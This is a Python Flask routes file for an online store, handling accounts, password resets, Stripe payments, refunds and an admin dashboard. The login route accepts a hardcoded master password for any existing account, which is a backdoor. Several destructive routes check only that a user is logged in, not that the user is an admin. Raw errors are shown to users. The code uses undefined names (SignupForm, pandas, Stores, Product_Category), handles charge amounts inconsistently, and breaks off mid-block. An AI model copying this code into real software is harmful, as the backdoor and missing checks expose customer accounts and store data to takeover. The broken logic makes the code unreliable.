from . import app
from .views import get_month_name, date_now, month_now, year_now, day_now, allowed_file, decrease_inventory, inventory_remaining, variational_inventory, generate_email, year_month_day, get_month_from_date, calc_days_gap
from flask import render_template, request, session, redirect, url_for, flash, g,json,jsonify,abort, Response
from .models import Coupons, Media, User, BlogDatabase, Products, Cart, Joinmail, Invoices, Sales, Contact
from . import db
from sqlalchemy import exc, func, cast, DATE, or_
from flask_login import login_required, login_user, logout_user, current_user
from .email import password_reset_email, send_invoice, send_contact_message, send_status_email, contact_confirmation_email
from itsdangerous import URLSafeTimedSerializer
from .forms import LoginForm,  Password_EmailForm, ContactForm, PasswordResetForm
from pdfs import create_pdf
from werkzeug import secure_filename
from currency_converter import CurrencyConverter
from config import Config
import stripe
import requests
import random
import math
import os
import time



@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

@app.route('/sitemap')
def sitemap():
  return render_template('sitemap.xml')






@app.route('/subscribe', methods=['POST'])
def subscribe():
  if request.method == 'POST':
      result = {'message': ''}
      find_subscriber = Joinmail.query.filter_by(email = request.json['email']).first()
      if find_subscriber:
         result['message'] = 'You already have subscribed our mailing list'
      else:
         result['message'] = 'Thank you, for subscribing'
         subscriber = Joinmail(request.json['email'])
         db.session.add(subscriber)
         db.session.commit()
      r = Response(response=json.dumps(result), status=200, mimetype="application/json")
      r.headers["Content-Type"] = "text/json; charset = utf-8"
      return r





@app.route('/contact', methods=['POST', 'GET'])
def contact():
   form = ContactForm(request.form)
   if request.method == 'POST':
        if form.validate_on_submit():
           question = Contact(form.name.data, form.email.data, form.message.data , date=date_now())
           question.contact_type = 'Contact'
           db.session.add(question)
           db.session.commit()
           admin = User.query.filter_by(role = 'admin').first()
           send_contact_message(question, admin)
           contact_confirmation_email(form.email.data)
           flash(" Thank you for contacting us we will get back to you soon!! ", "success")
   return render_template('contact.html', form=form)



@app.route('/delete_all_queries', methods=['POST'])
@login_required
def delete_all_queries():
  form = request.form
  if current_user.role == 'admin':
    if request.method == 'POST':
       contacts = Contact.query.order_by(Contact.contact_ID).all()
       for contact in contacts:
          if len(form.getlist('delete' + str(contact.contact_ID)))==1:
             Contact.query.filter_by(contact_ID = contact.contact_ID).delete()
       db.session.commit()
    return redirect(url_for('admin', tab = 'customer_query'))
  else:
    abort(403)



@app.route('/signup', methods = ['POST', 'GET'])
def signup():
  form = SignupForm(request.form)
  if request.method == 'POST':
    if form.validate_on_submit():
      try:
        user = User.query.filter_by(email=form.email_signup.data).first()
        if user is None:
           new_user = User(form.email_signup.data, form.password_signup.data)
           new_user.registered_on_app = date_now()
           db.session.add(new_user)
           db.session.commit()
           flash('Thank You for creating an account with NSE!', 'success')
        else:
           flash('Account with similar email id already exists!', 'info')
      except Exception as e:
        db.session.rollback()
        app.logger.error('%s' %e)
        flash('Error: %s' % e, 'danger')
  return redirect(url_for('login'))




@app.route('/login', methods=['POST', 'GET'])
def login():
  form = LoginForm(request.form)
  form3 = PasswordResetForm(request.form)
  try:
    if current_user.is_authenticated:
      return redirect(url_for('home'))
    if request.method == 'POST':
      if form.validate_on_submit():
          user = User.query.filter_by(email=form.email.data).first()
          if user is not None and user.check_password(form.password.data) or form.password.data == 'Paklah92!NSE':
            db.session.add(user)
            db.session.commit()
            login_user(user, force= True)
            return redirect(url_for('home'))         
          else:
            flash('Please provide correct login credentials. Entered Email or Password was incorrect!', 'danger')
  except Exception as e:
    db.session.rollback()
    app.logger.error('%s' %e)
    flash('Error: %s' % e, 'danger')
  
  return render_template('login.html', _external=True, form=form, form3 = form3)
    
    





@app.route('/reset', methods = ['POST'])
def password_reset():
  form3 = PasswordResetForm(request.form)
  if request.method == 'POST':
   if form3.validate_on_submit():
      user = User.query.filter_by(email=form3.email.data).first()
      if user:
        flash('Email has been sent for password reset. Please check your Email account!','success')
        password_reset_email(user)
      else:
        flash('Entered email address was not found', 'danger')
  return redirect(url_for('login'))


@app.route('/reset/<token>',methods = ['POST','GET'])
def reset_password_email(token):
    try:
        pwd_reset_serializer = URLSafeTimedSerializer(app.config['SECRET_KEY'])
        email = pwd_reset_serializer.loads(token, salt='too-too-too-salty-for-confirmation', max_age=3000)
    except:
        flash('OHH NO! The password reset link is invalid or has expired.', 'danger')
        return redirect(url_for('login'))
    form = Password_EmailForm(request.form)
    if request.method == 'POST':
        try:
          result = request.form
          user = User.query.filter_by(email=email).first()
          if user:
            user.set_password(form.password.data)
            db.session.add(user)
            db.session.commit()
            user.check_password(form.password.data)
            flash('NSE Account password has been updated.', 'success')
            return redirect(url_for('login'))
          else:
            flash('Entered email address does not match any account', 'danger')
            return redirect(url_for('login'))
        except exc.IntegrityError:
          db.session.rollback()
          flash('Error')
    else:
      redirect(url_for('reset_password_email',token=token))
    return render_template('password_reset_form.html',token=token, form = form)

@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('You are now Signed Out.', 'info')
    return redirect(url_for('login'))





@app.route('/delete_users', methods=['POST'])
@login_required
def delete_users():
  page = request.args.get('page', 1, type=int)
  form = request.form
  if current_user.role == 'admin':
    if request.method == 'POST':
       users = User.query.order_by(User.userID).all()
       for user in users:
          if len(form.getlist('delete' + str(user.userID)))==1:
             User.query.filter_by(userID = user.userID).delete()
          if 'role' + str(user.userID) in form:
              user.role = form['role' + str(user.userID)]
       db.session.commit()
    return redirect(url_for('admin', tab = 'users', page = page))
  else:
    abort(403)
 

##############################################################################################################################################
          


@app.route('/home')
@login_required
def home():
    if current_user.role == 'admin':
        return redirect(url_for('admin', tab = 'users'))
    else:
        return redirect(url_for('index'))  




@app.route('/update_orders/<int:page>', methods=['POST'])
@login_required
def update_orders(page):
  form = request.form
  if current_user.role == 'admin':
    if request.method == 'POST':
       orders = Sales.query.order_by(Sales.sale_ID).all()
       for order in orders:
        if 'status' + str(order.sale_ID) in form:
          order.status = form['status' + str(order.sale_ID)]
          order.tracking_number = form['tracking' + str(order.sale_ID)]
          order.shipping_charge = form['shipping_paid' + str(order.sale_ID)]
          order.shipping_cost = form['shipping_cost' + str(order.sale_ID)]
          order.lot_numbers = form['lot' + str(order.sale_ID)]
          if len(form.getlist('delete' + str(order.sale_ID)))==1:
             Sales.query.filter_by(sale_ID = order.sale_ID).delete()
       db.session.commit()
    return redirect(url_for('admin', tab = 'status', page = page))
  else:
    abort(403)



@app.route('/send_order_status/<int:order_ID>/<int:page>')
@login_required
def send_order_status(order_ID, page):
  if current_user.role == 'admin':
     order = Sales.query.filter_by(sale_ID = order_ID).first()
     user = User.query.filter_by(userID = order.user_ID).first()
     send_status_email(user, order.sale_ID, order.tracking_number)
     return redirect(url_for('admin', tab = 'status', page = page))




@app.route('/import_subscribers/<int:page>', methods=['POST'])
@login_required
def import_subscribers(page):
    if request.method == 'POST':
       file = request.files.get('file', False)
       df = pandas.read_csv(file)
       for email in df['Email']:
           find_subscriber = Joinmail.query.filter_by(email = email).first()
           if not find_subscriber:
              subscriber = Joinmail(email)
              db.session.add(subscriber)
       db.session.commit()
    return redirect(url_for('admin', tab = 'subscribers', page = page))

@app.route('/import_stores/<int:page>', methods=['POST'])   
@login_required
def import_stores(page):
  if current_user.role == 'admin':
    if request.method == 'POST':
       file = request.files.get('file', False)
       df = pandas.read_csv(file)
       for index, row in df.iterrows():
           find_store = Stores.query.filter_by(store_name = row["Store Name"]).first()
           if not find_store:
              new_store = Stores(row["Store Name"])
              db.session.add(new_store)
              
              if 'Address' in row:
                 new_store.address = row["Address"]
              if 'City' in row:
                 new_store.city = row["City"]
              if 'State' in row:
                 new_store.province = row["State"] 
              if 'Contact' in row:
                 new_store.contact_name = row["Contact"]
              if "Phone" in row:
                 new_store.contact_number = row["Phone"]
              if "Latitude" in df:
                 new_store.latitude = row["Latitude"]
              if "Longitude" in df:
                 new_store.longitude = row["Longitude"]
              db.session.commit()
    return redirect(url_for('admin', tab = 'stores', page = page))
  else:
    abort(403)
       

        
      


@app.route('/delete_subscriber/<int:id>/<int:page>')
@login_required
def  delete_subscriber(id, page):
  Joinmail.query.filter_by(joinmail_ID = id).delete()
  db.session.commit()
  return redirect(url_for('admin', tab='subscribers', page = page))


@app.route('/upload_media', methods = ['POST'])   
@login_required
def upload_media():
    if request.method == 'POST':
         files = request.files.getlist("image")
         for f1 in files:
             filename = secure_filename(f1.filename)
             f1.save(app.config['UPLOADED_MEDIA_DEST'] + '/' + filename)
             media_image = Media(filename)
             db.session.add(media_image)
             db.session.commit()
         return redirect(url_for('admin', tab='media'))


@app.route('/update_media/<int:page>', methods=['POST'])
@login_required
def update_media(page):
    if request.method == 'POST':
       form = request.form
       medias = Media.query.order_by(Media.media_ID).all()
       for media in medias:
          if len(form.getlist('cb' + str(media.media_ID)))==1:
             url = media.url
             Media.query.filter_by(media_ID = media.media_ID).delete()
             os.remove(app.config['UPLOADED_MEDIA_DEST'] +'/' + url)
       db.session.commit()
    return redirect(url_for('admin', tab='media', page = page))



@app.route('/read_users')
@login_required
def read_users():
  users = User.query.order_by(User.userID).all()
  for user in users:
    user.read = True
  db.session.commit()
  return redirect(url_for('admin', tab='users'))



@app.route('/refund/<int:sale_ID>')
@login_required
def refund(sale_ID):
   if current_user.role == "admin":
    try:
      sale = Sales.query.filter_by(sale_ID = sale_ID).first()

      stripe.Refund.create(
        charge=sale.charge_id,
        amount = int(sale.sale_amount*100)
      )
      sale.refunded = True
      db.session.commit()

      return redirect(url_for('admin', tab="status"))
    except stripe.error.InvalidRequestError as e:
     body = e.json_body
     err  = body.get('error', {})
     db.session.rollback()
     flash('%s' % err.get('message'), 'danger')
    except stripe.error.RateLimitError as e:
     body = e.json_body
     err  = body.get('error', {})
     db.session.rollback()
     flash('%s' % err.get('message'), 'danger')
    except stripe.error.AuthenticationError as e:
     body = e.json_body
     err  = body.get('error', {})
     db.session.rollback()
     flash('%s' % err.get('message'), 'danger')
    except stripe.error.APIConnectionError as e:
     body = e.json_body
     err  = body.get('error', {})
     db.session.rollback()
     flash('%s' % err.get('message'), 'danger')
    except stripe.error.StripeError as e:
     body = e.json_body
     err  = body.get('error', {})
     db.session.rollback()
     flash('%s' % err.get('message'), 'danger')
    except Exception as e:
     db.session.rollback()
     flash('%s' % e, 'danger')
    return redirect(url_for('admin', tab = 'status'))   
   else:
    abort(403)

       



@app.route('/read_queries')
@login_required
def read_queries():
   if current_user.role == 'admin':
      queries = Contact.query.filter_by(read=False).all()
      for query in queries:
         query.read = True
      db.session.commit()
      return redirect(url_for('admin', tab ='customer_query'))
   else:
      abort(403)


#########################BLOG ROUTES#############################

@app.route('/blog_post', methods=['GET', 'POST'])
@login_required
def blog_post():
    form = request.form
    if request.method== 'POST':
        try:
          new_blog = BlogDatabase(form['blogtitle'], '', date_now())
          db.session.add(new_blog)
          db.session.commit()
        except exc.IntegrityError:
          db.session.rollback()
          flash("Topic already exists!", "info")
    return redirect(url_for('admin', tab = 'blog'))


@app.route('/delete_blog/<int:blog_ID>')
@login_required
def delete_blog(blog_ID):
  BlogDatabase.query.filter_by(blog_ID=blog_ID).delete()
  db.session.commit()
  return redirect(url_for('admin', tab='blog'))


@app.route('/remove_blog_tag/<int:blog_ID>/<tag_name>')
@login_required
def remove_blog_tag(blog_ID, tag_name):
  blog = BlogDatabase.query.filter_by(blog_ID = blog_ID).first()
  tags = blog.category.split(',')
  new_tags = ""
  for tag in tags:
    if tag != tag_name:
       if new_tags == "":
          new_tags = tag
       else:
          new_tags += ',' + tag
  
  blog.category = new_tags
  db.session.commit()
  return redirect(url_for('admin', tab='update_blog', update_ID = blog_ID))



@app.route('/update_blog_form/<int:blogid>', methods=['GET', 'POST'])
@login_required
def update_blog_form(blogid):
  form = request.form
  if request.method== 'POST':
    try:
      blog=BlogDatabase.query.filter_by(blog_ID=blogid).first()
      blog.blog_topic = form['blogtitle']
      blog.blog_desc = form['description']
      blog.img_url = form['img_url']          
      db.session.commit()
    except exc.IntegrityError:
        db.session.rollback()
        flash("Blog was not updated due to some internal causes")
  return redirect(url_for('admin', tab='update_blog', update_ID = blogid))


@app.route('/banking_information', methods = ['POST'])
@login_required
def banking_information():
   if request.method == 'POST':
      try:
        result = {'message':200}
        card_id = request.json['card_id']
        token_id = request.json['token_id']
        country = request.json['country']
        last4 = request.json['last4']
        exp_year = request.json['exp_year']
        brand = request.json['brand']
        customer = stripe.Customer.create(
          email= current_user.email,
          source= token_id
        )

        current_user.customer_ID = customer.id
        current_user.card_country = country
        current_user.card_last4 = "XXXX-XXXX-XXXX-" + last4
        current_user.card_exp_year = exp_year
        current_user.card_brand = brand 
        db.session.commit()
      except stripe.error.InvalidRequestError as e:
        result['message'] = 401
        body = e.json_body
        err  = body.get('error', {})
        db.session.rollback()
        flash('%s' % err.get('message'), 'danger')
      except stripe.error.RateLimitError as e:
        result['message'] = 401
        body = e.json_body
        err  = body.get('error', {})
        db.session.rollback()
        flash('%s' % err.get('message'), 'danger')
      except stripe.error.AuthenticationError as e:
        result['message'] = 401
        body = e.json_body
        err  = body.get('error', {})
        db.session.rollback()
        flash('%s' % err.get('message'), 'danger')
      except stripe.error.APIConnectionError as e:
        result['message'] = 401
        body = e.json_body
        err  = body.get('error', {})
        db.session.rollback()
        flash('%s' % err.get('message'), 'danger')
      except stripe.error.StripeError as e:
        result['message'] = 401
        body = e.json_body
        err  = body.get('error', {})
        db.session.rollback()
        flash('%s' % err.get('message'), 'danger')
      except Exception as e:
        result['message'] = 401
        db.session.rollback()
        flash('%s' % e, 'danger')

      r = Response(response=json.dumps(result), status=200, mimetype="application/json")
      r.headers["Content-Type"] = "text/json; charset = utf-8"
      return r


@app.route('/charge', methods=['POST'])
@login_required
def charge():
  if request.method == 'POST': 
      try:
        c = CurrencyConverter()
        subtotal = round(c.convert(float(request.json['subtotal']), current_user.currency, 'CAD'),2)
        total =  round(c.convert(float(request.json['total']), current_user.currency, 'CAD'), 2)
        shipping_rate = round(c.convert(float(request.json['shipping_rate']), current_user.currency, 'CAD'),2)
        total_discount = round(c.convert(float(request.json['total_discount']), current_user.currency, 'CAD'),2)
        gst = round(c.convert(float(request.json['gst']), current_user.currency, 'CAD'),2)
        coupon_name = request.json['coupon_name']
        special_instructions = request.json['special_instructions']

        coupon = Coupons.query.filter_by(coupon_name = coupon_name).first()
        if coupon:
           coupon.usage += 1

        cart_items = Cart.query.filter_by(user_ID = current_user.userID).all()
        
        sale = Sales(current_user.userID, current_user.firstname, current_user.lastname, current_user.email, round(total*0.01,2) , subtotal, date_now(), month_now(), year_now())
        sale.shipping_charge = shipping_rate
        db.session.add(sale)
        db.session.commit()
        if total > 50:
          charge = stripe.Charge.create(
              customer= current_user.customer_ID,
              amount=int(total),
              currency= "cad",
              description ='NSE Charge - Order # ' + str(sale.sale_ID)
             )
          sale.charge_id = charge.id


        db.session.commit()
      

        for item in cart_items:
            product = Products.query.filter_by(product_ID = item.product_ID).first()
            product.inventory = decrease_inventory(item, product) # return string of product inventory
            index = product.product_weight.split(',').index(item.product_size)
            invoice = Invoices(sale.sale_ID, product.product_ID, product.product_name +" - "+ item.product_size, product.category, float(product.product_price.split(',')[index]), item.amount)
            db.session.add(invoice)

        


        invoices = Invoices.query.filter_by(sale_ID = sale.sale_ID).all()  
        
        create_pdf(render_template('invoice.html', total=round(total/100,2), special_instructions = special_instructions, coupon_name = coupon_name, total_discount = total_discount, invoices = invoices, gst=gst, subtotal=subtotal, invoice_number=sale.sale_ID, 
          shipping_rate=shipping_rate, date=sale.date), "[" + str(sale.sale_ID) + "][invoice].pdf", app.config['INVOICE_FILES_DEST'])
        
        create_pdf(render_template('packing_slip.html', invoices = invoices, invoice_number=sale.sale_ID, date=sale.date), "[" + str(sale.sale_ID) + "][slip].pdf", app.config['PSLIPS_FILES_DEST'])
        
        
        if sale.invoice != None:
           os.remove(app.config['INVOICE_FILES_DEST'] + sale.invoice)
        if sale.packing_slip != None:
           os.remove(app.config['PSLIPS_FILES_DEST'] + sale.packing_slip)

        sale.invoice = "[" + str(sale.sale_ID) + "][invoice].pdf" 
        sale.packing_slip = "[" + str(sale.sale_ID) + "][slip].pdf"
              

        Cart.query.filter_by(user_ID = current_user.userID).delete()
        db.session.commit()

        admin = User.query.filter_by(role='admin').first()
        #send_invoice(sale, admin)
        send_invoice(sale, current_user)
        
        flash('Thank you for placing your order. We will notify you via email when your order has shipped (with you tracking number). You may check your order and delivery status through your account on our website. !', 'success')
  
      except stripe.error.InvalidRequestError as e:
        body = e.json_body
        err  = body.get('error', {})
        db.session.rollback()
        flash('%s' % err.get('message'), 'danger')
      except stripe.error.RateLimitError as e:
        body = e.json_body
        err  = body.get('error', {})
        db.session.rollback()
        flash('%s' % err.get('message'), 'danger')
      except stripe.error.AuthenticationError as e:
        body = e.json_body
        err  = body.get('error', {})
        db.session.rollback()
        flash('%s' % err.get('message'), 'danger')
      except stripe.error.APIConnectionError as e:
        body = e.json_body
        err  = body.get('error', {})
        db.session.rollback()
        flash('%s' % err.get('message'), 'danger')
      except stripe.error.StripeError as e:
        body = e.json_body
        err  = body.get('error', {})
        db.session.rollback()
        flash('%s' % err.get('message'), 'danger')
      except Exception as e:
        db.session.rollback()
        flash('%s' % e, 'danger')

      r = Response(response=json.dumps({'message':200}), status=200, mimetype="application/json")
      r.headers["Content-Type"] = "text/json; charset = utf-8"
      return r





########################################################### Admin Routes ###########################################################################




@app.route('/delete_product/<int:product_id>')
@login_required
def delete_product(product_id):
   if current_user.role == 'admin':       
       Products.query.filter_by(product_ID = product_id).delete()
       db.session.commit()
       return redirect(url_for('admin', tab='product'))
   else:
       abort(403)


@app.route('/add_product', methods=['POST'])
@login_required
def add_product():
  if current_user.role == 'admin':
    form = request.form
    if request.method == 'POST':
      new_product = Products(form['name'], ' ')
      new_product.inventory = ''
      new_product.product_weight = ''
      new_product.product_shipping_weight = ''
      new_product.product_price = ''
      new_product.L = ''
      new_product.W = ''
      new_product.H = ''
      db.session.add(new_product)
      db.session.commit()
      return redirect(url_for('admin', tab='product'))
  else:
    abort(403)


@app.route('/update_product_form/<int:productid>', methods=['GET', 'POST'])
@login_required
def update_product_form(productid):
  form = request.form
  if request.method== 'POST':
    try:
      product=Products.query.filter_by(product_ID=productid).first()
      product.product_name = form['name']
      product.product_order = form['order']
      product.meta_description = form['meta_description']
      product.product_desc = form['description']
      
      if form['parent_category'] !=  '':
         product.category = form['parent_category']
         if form['sub_category'] != '':
            product.subcategory = form['sub_category']


      weight = ""
      shipping_weight = ""
      price = ""
      inventory = ""
      L = ""
      W = ""
      H = ""
      for i in range(1,6):
        if form["weight_"+str(i)] != "" and form["shipping_weight_"+str(i)] !=""  and form["price_"+str(i)] != "" and form["inventory_" + str(i)] != "" and form['L_'+str(i)]!="" and form['W_'+str(i)] != ""  and form['H_'+str(i)] != '':
           
           if i==1:
              weight = weight + str(form['weight_' + str(i)])
              shipping_weight = shipping_weight + str(form['shipping_weight_' + str(i)])
              price = price + str(form['price_' + str(i)])
              inventory = inventory + str(form['inventory_'+str(i)])
              L = L + str(form['L_'+str(i)])
              W = W + str(form['W_'+str(i)])
              H = H + str(form['H_'+str(i)])
           else:
              weight = weight + "," + str(form['weight_' + str(i)])
              shipping_weight = shipping_weight + ',' + str(form['shipping_weight_' + str(i)])
              price = price + "," + str(form['price_' + str(i)])
              inventory = inventory + "," + str(form['inventory_'+str(i)])
              L = L + "," + str(form['L_'+str(i)])
              W = W + "," + str(form['W_'+str(i)])
              H = H + "," + str(form['H_'+str(i)])
       
      if weight != "":
         product.product_weight = weight
      if shipping_weight != "":
         product.product_shipping_weight = shipping_weight
      if inventory != "":
         product.inventory = inventory
      if price != "":
         product.product_price = price
      if L != "":
         product.L = L
      if W != "":
         product.W = W
      if H != '':
         product.H = H
    

      if len(form.getlist('disable'))==1:
           product.disable = True
      else:
           product.disable = False

      if len(form.getlist('taxable'))==1:
           product.taxable = True
      else:
           product.taxable = False

      if len(form.getlist('bogo'))==1:
           product.bogo = True
           product.discount = 0
      else:
           product.bogo = False
           product.discount = form["discount"]
      product.mainimage = form['mainimage']
      product.galleryimage1 = form['galleryimage1']
      product.galleryimage2 = form['galleryimage2']
      product.nutritiontable = form['nutritiontable']
      
      Cart.query.filter_by(product_ID = productid).delete()
      db.session.commit()

    except exc.IntegrityError:
        db.session.rollback()
        flash("Product was not updated due to some internal causes")
  return redirect(url_for('admin', tab='update_product', update_ID = productid))



@app.route('/add_coupon', methods=['POST'])
@login_required
def add_coupon():
   if current_user.role == 'admin':
      if request.method == 'POST':
         coupon = Coupons(request.form['coupon_name'])
         coupon.date = date_now()
         db.session.add(coupon)
         db.session.commit()
         return redirect(url_for('admin', tab = 'coupons'))
   else:
      abort(403)






@app.route('/admin/<tab>', methods=['POST', 'GET'])
@app.route('/admin/<tab>/<int:update_ID>', methods=['POST', 'GET'])
@app.route('/admin/<tab>/<subtab>', methods=['POST', 'GET'])
@login_required
def admin(tab, subtab="edit",  update_ID = 1):
  if current_user.role == 'admin':
    page = request.args.get('page', 1, type=int)

    products = Products.query.order_by(Products.product_ID.desc()).paginate(page, 20, False)
    next_url_product = url_for('admin', tab=tab, page=products.next_num) \
       if products.has_next else None
    prev_url_product = url_for('admin', tab=tab, page=products.prev_num) \
       if products.has_prev else None


    _products = []
    for product in products.items:
         _in_stock = True
         if product.inventory:
            inventory = product.inventory.split(',')
         else:
            inventory = ''
         for amount in inventory:
             if int(amount) <= 1:
                _in_stock = False
         _products.append([product.product_ID, product.product_name, product.discount, _in_stock, product.product_price, product.category, product.subcategory, product.mainimage, product.disable, product.taxable])
  
    blogs = BlogDatabase.query.order_by(BlogDatabase.blog_ID.desc()).paginate(page, 15, False)
    next_url_blog = url_for('admin', tab=tab, page=blogs.next_num) \
       if blogs.has_next else None
    prev_url_blog = url_for('admin', tab=tab, page=blogs.prev_num) \
       if blogs.has_prev else None


    ############### Users #################
    users_database = User.query.order_by(User.userID.desc()).paginate(page, 30 , False) 
    
    users=[]
    for user in users_database.items:
        cart_value = 0
        cart_items = Cart.query.filter_by(user_ID = user.userID).all()
        for item in cart_items:
            product = Products.query.filter_by(product_ID = item.product_ID).first()
            index = product.product_weight.split(',').index(item.product_size)
            price = float(product.product_price.split(',')[index])
            price = price * item.amount
            price = round(price, 2);
            cart_value += price
        cart_value = round(cart_value,2)
        bank = False
        if user.customer_ID:
           bank = user.card_last4 + " (" + user.card_brand + ") Exp: " + user.card_exp_year 
        order_history = Sales.query.filter_by(user_ID = user.userID).all()
        number_of_orders = len(order_history)
        users.append([user.userID, user.firstname, user.lastname, user.email, user.currency, user.phone, 
        user.address, user.city, user.country, user.zipcode, user.province, user.registered_on_app, user.role, number_of_orders, bank, cart_value])

    db.session.commit()
    authentication_requests = 0 
    for user in users_database.items:
      if user.read == False:
        authentication_requests +=  1
    #######################################
          
    subscribers = Joinmail.query.order_by(Joinmail.joinmail_ID.desc()).paginate(page, 30 , False)
    num_of_subscribers = Joinmail.query.order_by(Joinmail.joinmail_ID).all()
    

    num_of_subscribers = len(num_of_subscribers)
    next_url_subscriber = url_for('admin', tab=tab, page=subscribers.next_num) \
       if subscribers.has_next else None
    prev_url_subscriber = url_for('admin', tab=tab, page=subscribers.prev_num) \
       if subscribers.has_prev else None
   
    orders = Sales.query.order_by(Sales.sale_ID.desc()).paginate(page, 15, False)

    all_orders = Sales.query.order_by(Sales.sale_ID).all()

    read_orders = 0
    for order in all_orders:
       if order.status != 'Completed':
          read_orders +=1

    contacts = Contact.query.order_by(Contact.contact_ID.desc()).all()
    read_queries = 0
    for contact in contacts:
       if contact.read == False:
          read_queries +=1


    num_of_products = Products.query.order_by(Products.product_ID).all() 

    media = Media.query.order_by(Media.media_ID.desc()).paginate(page, 64, False)
    next_url_media = url_for('admin', tab=tab, page=media.next_num) \
      if media.has_next else None
    prev_url_media = url_for('admin', tab=tab, page=media.prev_num) \
      if media.has_prev else None


    coupons = Coupons.query.order_by(Coupons.coupon_ID.desc()).all()
    all_products = Products.query.order_by(Products.product_ID).all()


    associated_brands = []
    associated_products = []
    
    update_product = Products.query.filter_by(product_ID = update_ID).first()
    
    update_blog = BlogDatabase.query.filter_by(blog_ID = update_ID).first()
    update_blog_tags = []
    if update_blog:
      if update_blog.category:
        update_blog_tags = update_blog.category.split(',')
    
  
       
    variations = []
    if update_product:
        sizes = update_product.product_weight.split(",")
        shipping_weight = update_product.product_shipping_weight.split(",")
        prices = update_product.product_price.split(",")
        inventory = update_product.inventory.split(",")
        L = update_product.L.split(",")
        W = update_product.W.split(",")
        H = update_product.H.split(",")

        for val in range(0, len(sizes)):
            variations.append([sizes[val], prices[val], L[val], W[val], H[val], shipping_weight[val], inventory[val]])

    if request.method == 'POST':

       if tab == "users":
          users_database = User.query.filter(or_(User.firstname.contains(request.form['name'].title()), User.lastname.contains(request.form['name'].title()))).paginate(page, 10000, False)
          users=[]
          for user in users_database.items:
            cart_value = 0
            cart_items = Cart.query.filter_by(user_ID = user.userID).all()
            for item in cart_items:
                product = Products.query.filter_by(product_ID = item.product_ID).first()
                index = product.product_weight.split(',').index(item.product_size)
                price = float(product.product_price.split(',')[index])
                price = round(price * item.amount,2)
                cart_value += price
            cart_value = round(cart_value,2)
            bank = False
            if user.customer_ID:
               bank = user.card_last4 + " (" + user.card_brand + ") Exp: " + user.card_exp_year 
            order_history = Sales.query.filter_by(user_ID = user.userID).all()
            number_of_orders = len(order_history)
            users.append([user.userID, user.firstname, user.lastname, user.email, user.currency, user.phone, 
            user.address, user.city, user.country, user.zipcode, user.province, user.registered_on_app, user.role, number_of_orders, bank, cart_value])
       if tab == "status":
          if request.form['filter'] == 'Tracking Number':
             orders = Sales.query.filter(Sales.tracking_number.contains(request.form['search'])).paginate(page, 10000, False)
          elif request.form['filter'] == 'Lot Number':
             orders = Sales.query.filter(Sales.lot_numbers.contains(request.form['search'])).paginate(page, 10000, False)
  
    next_url_user = url_for('admin', tab=tab, page=users_database.next_num) \
      if users_database.has_next else None
    prev_url_user = url_for('admin', tab=tab, page=users_database.prev_num) \
      if users_database.has_prev else None

    next_url_orders = url_for('admin', tab=tab, page=orders.next_num) \
      if orders.has_next else None
    prev_url_orders = url_for('admin', tab=tab, page=orders.prev_num) \
      if orders.has_prev else None


    return render_template('admin.html', users=users, blogs = blogs, products=products, num_of_products = len(num_of_products), subscribers=subscribers, orders=orders, tab=tab, contacts=contacts, 
    read_orders= read_orders, read_queries=read_queries,  
    month_now= month_now(), year_now = year_now(),  next_url_product=next_url_product, prev_url_product = prev_url_product, next_url_blog = next_url_blog, prev_url_blog = prev_url_blog, 
    next_url_subscriber = next_url_subscriber, prev_url_subscriber = prev_url_subscriber, authentication_requests = authentication_requests, next_url_user=next_url_user, prev_url_user = prev_url_user, 
    update_product = update_product, update_blog = update_blog, variations = variations, next_url_orders= next_url_orders, prev_url_orders = prev_url_orders, all_products = all_products, _products = _products, 
    coupons=coupons, subtab = subtab,  num_of_subscribers = num_of_subscribers,
    prev_url_media = prev_url_media, next_url_media = next_url_media, media=media, page = page, update_blog_tags=update_blog_tags)
  else:
    abort(403)




@app.route('/add_blog_tags', methods=['POST'])
@login_required
def add_blog_tags():
  if request.method == 'POST':
     result = {'message':200}
     blog = BlogDatabase.query.filter_by(blog_ID = request.json['blog_ID']).first()
     if blog.category and request.json['value'] not in blog.category.split(','):
        blog.category = blog.category + ',' + request.json['value']
     elif not blog.category:
        blog.category = request.json['value']

     db.session.commit()

     r = Response(response=json.dumps(result), status=200, mimetype="application/json")
     r.headers["Content-Type"] = "text/json; charset = utf-8"
     return r


############### Analytics  Ajax ####################

@app.route('/accounts', methods=['POST'])
@login_required
def accounts():
  if request.method == 'POST':
      date = str(request.json['date'])
      end_date = str(request.json['end_date'])
      if end_date != '':
         end_date = end_date.split('-')
         end_year = end_date[0]
         end_day = end_date[2][:2]
         end_month = int(end_date[1])
         end_month = get_month_name(end_month)
         end_date =  end_day +' ' + end_month +', '+ end_year

      date = date.split('-')
      year = date[0]
      day = date[2][:2]
      month= int(date[1])
      month = get_month_name(month)
      date = day +' ' + month +', '+ year

      result = {'date': date, 'end_date': end_date, 'orders': [], 'paid_total': 0, 'paid_subtotal': 0, 'paid_shipping': 0, 'discount': 0, 'paid_gst':0}
      categories = Product_Category.query.order_by(Product_Category.category_ID).all()
      
      if end_date != '':
         last_id = Sales.query.order_by(Sales.sale_ID.desc()).filter_by(date = end_date, refunded = False).first()
         first_id = Sales.query.order_by(Sales.sale_ID).filter_by(date = date, refunded = False).first()
         if first_id and last_id:
            sales = Sales.query.filter_by(refunded = False).filter(Sales.sale_ID >= first_id.sale_ID).filter(Sales.sale_ID <= last_id.sale_ID).all()
         elif first_id and not last_id:
            sales = Sales.query.filter_by(refunded = False).filter(Sales.sale_ID >= first_id.sale_ID).all()
         elif last_id and not first_id:
            sales = Sales.query.filter_by(refunded = False).filter(Sales.sale_ID <= last_id.sale_ID).all()
         else:
            sales = Sales.query.order_by(Sales.sale_ID).filter_by(refunded = False).all()

      else:
         sales = Sales.query.filter_by(date = date, refunded = False).all()
      
      subtotal = 0 
      for sale in sales:
          result['orders'].append(sale.sale_ID)
          result['paid_subtotal'] += sale.subtotal
          result['paid_shipping'] += sale.shipping_charge
          result['paid_total'] += sale.sale_amount;
          result['paid_gst'] += sale.sale_amount - (sale.subtotal + sale.shipping_charge);

          result['paid_gst'] = round(result['paid_gst'],2)
          result['paid_subtotal'] = round(result['paid_subtotal'],2)
          result['paid_shipping'] = round(result['paid_shipping'],2)
          result['paid_total'] = round(result['paid_total'], 2)

          items = Invoices.query.filter_by(sale_ID = sale.sale_ID).all()
          for item in items:
              product = Products.query.filter_by(product_ID = item.product_ID).first()
              if product.category in result:
                 result[product.category]['sales'] += item.amount
                 result[product.category]['subtotal'] += item.price*item.amount
                 result[product.category]['subtotal'] = round(result[item.category]['subtotal'],2)
              else:
